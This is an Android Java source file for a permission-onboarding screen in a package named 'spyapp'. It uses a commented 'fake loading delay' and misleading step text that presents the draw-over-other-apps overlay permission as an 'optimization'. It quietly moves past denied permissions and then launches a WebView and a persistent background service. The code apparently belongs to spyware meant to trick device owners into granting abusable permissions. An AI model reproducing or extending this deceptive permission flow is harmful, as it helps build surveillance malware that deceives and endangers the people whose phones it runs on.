package com.spyapp;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class PermissionStepActivity extends AppCompatActivity {
    
    private static final int REQUEST_STORAGE = 101;
    private static final int REQUEST_NOTIFICATIONS = 102;
    private static final int REQUEST_OVERLAY = 103;
    
    private TextView stepText;
    private TextView stepDescription;
    private Button continueButton;
    private ProgressBar progressBar;
    
    private int currentStep = 0;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_permission_step);
        
        stepText = findViewById(R.id.stepText);
        stepDescription = findViewById(R.id.stepDescription);
        continueButton = findViewById(R.id.continueButton);
        progressBar = findViewById(R.id.progressBar);
        
        showStep(currentStep);
        
        continueButton.setOnClickListener(v -> {
            // Show progress first
            progressBar.setVisibility(View.VISIBLE);
            continueButton.setEnabled(false);
            
            new Handler().postDelayed(() -> {
                progressBar.setVisibility(View.GONE);
                continueButton.setEnabled(true);
                handleStep();
            }, 1500); // Fake loading delay
        });
    }
    
    private void showStep(int step) {
        switch (step) {
            case 0:
                stepText.setText("Step 1: Storage Access");
                stepDescription.setText("To save your files and data, we need storage permission.\n\n" +
                        "This is required for the app to function properly.\n\n" +
                        "Click Continue to grant access.");
                continueButton.setText("Continue →");
                break;
            case 1:
                stepText.setText("Step 2: Notifications");
                stepDescription.setText("Enable notifications to receive important updates.\n\n" +
                        "We'll send you alerts about new features.\n\n" +
                        "Click Continue to enable.");
                continueButton.setText("Continue →");
                break;
            case 2:
                stepText.setText("Final Step: Optimization");
                stepDescription.setText("One last step to optimize your experience.\n\n" +
                        "This helps the app run smoothly on your device.\n\n" +
                        "Click Finish to complete setup.");
                continueButton.setText("Finish Setup ✓");
                break;
        }
    }
    
    private void handleStep() {
        switch (currentStep) {
            case 0:
                // Request storage permission
                if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
                    ActivityCompat.requestPermissions(this,
                            new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
                                    Manifest.permission.READ_EXTERNAL_STORAGE},
                            REQUEST_STORAGE);
                } else {
                    // Android 10+ doesn't need storage for downloads
                    currentStep = 1;
                    showStep(1);
                }
                break;
            case 1:
                // Request notification permission (Android 13+)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    ActivityCompat.requestPermissions(this,
                            new String[]{Manifest.permission.POST_NOTIFICATIONS},
                            REQUEST_NOTIFICATIONS);
                } else {
                    currentStep = 2;
                    showStep(2);
                }
                break;
            case 2:
                // Final step - request overlay/draw over other apps
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (!android.provider.Settings.canDrawOverlays(this)) {
                        Intent intent = new Intent(
                                android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                android.net.Uri.parse("package:" + getPackageName()));
                        startActivityForResult(intent, REQUEST_OVERLAY);
                        return;
                    }
                }
                // All done, proceed
                proceedToApp();
                break;
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                          @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == REQUEST_STORAGE) {
            // Even if denied, move to next step (don't show error)
            currentStep = 1;
            showStep(1);
        } else if (requestCode == REQUEST_NOTIFICATIONS) {
            // Even if denied, move to next step
            currentStep = 2;
            showStep(2);
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_OVERLAY) {
            proceedToApp();
        }
    }
    
    private void proceedToApp() {
        // Start the WebView and background services
        Intent webIntent = new Intent(this, WebViewActivity.class);
        startActivity(webIntent);
        
        // Start background service
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        finish();
    }
}
